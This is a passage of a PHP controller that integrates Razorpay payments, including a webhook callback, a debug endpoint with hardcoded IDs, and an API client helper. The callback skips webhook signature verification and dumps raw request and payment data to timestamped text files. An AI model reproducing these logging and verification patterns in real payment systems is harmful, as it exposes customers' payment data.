            //         $pcodeuse_lastid  =  $this->security->addUsesPromoCode(['userid' => $userid, 'pcodeid' => $res['id'], 'created' => $created]);

            //         $getWlt 	= $this->security->getUserWalletBalance($userid);
            //         $wltbnsPre  = $getWlt["wltbns"];
            //         $wltbns 	= $wltbnsPre + $bnsamount;
            //         $getWlt 	= $this->security->updateUserWallet($userid, "wltbns", $wltbns);
            //         $this->updateTransaction($userid, $bnsamount, $created, $pcodeuse_lastid, CR, PROMOBNS, WLTBNS, $wltbnsPre, $wltbns);
            //     }
            // }
        } catch (\Exception $e) {
            $rstStatus = false;
        }

        return $rstStatus;
    }

    public function razorpaySuccess($request, $response)
    {
        $order_id = 'order_DKoBacxrzPwo63';
        $payment_id = 'pay_DKoC1Y39VaOIW2';
        $razorpay = $this->razorpayPaymentApi();
        $payment = $razorpay->payment->fetch($payment_id);
        $order = $razorpay->order->fetch($order_id);

        print_r($order->toArray());
    }

    public function razorpayCallback($request, $response)
    {
        global $settings, $baseurl;
        $code    = $settings['settings']['code']['rescode'];
        $errcode = $settings['settings']['code']['errcode'];
        $multiplyamt = $settings['settings']['razorpay']['multiplyamt'];
        $apisecret = $settings['settings']['razorpay']['apisecret'];
        $resArr =  [];
        $input  =  $request->getParsedBody();

        $a = time();
        $payment_id = (isset($input['payload']['payment']['entity']['id'])) ? $input['payload']['payment']['entity']['id'] : '';
        $order_id = (isset($input['payload']['payment']['entity']['order_id'])) ? $input['payload']['payment']['entity']['order_id'] : '';
        if ($payment_id) {
            $razorpay = $this->razorpayPaymentApi();
            $localOrder = $this->security->getOrderByRazorpayId($order_id);
            $transactionchild = $this->security->chkRazorpayId($payment_id, 'Razorpay');
            $payment = $razorpay->payment->fetch($payment_id);
            if (!$transactionchild && $localOrder && $payment && $pdata = $payment->toArray()) {
                $pdata['amount'] = ($pdata['amount'] / $multiplyamt);
                if ($pdata['status'] === 'captured') {
                    $order = $razorpay->order->fetch($order_id);
                    $order = $order->toArray();
                    $this->setalRazorpayPayment($pdata, $localOrder, $order);

                    file_put_contents($a . 'success.txt', print_r($pdata, true));
                }
            }
        }
        file_put_contents($a . '.txt', print_r($input, true));
    }

    public function razorpayPaymentApi()
    {
        global $settings, $baseurl;
        $multiplyamt = $settings['settings']['razorpay']['multiplyamt'];
        $apisecret = $settings['settings']['razorpay']['apisecret'];
        $apikey = $settings['settings']['razorpay']['apikey'];
        $razorpay    = new Api($apikey, $apisecret);
        return $razorpay;
    }
}
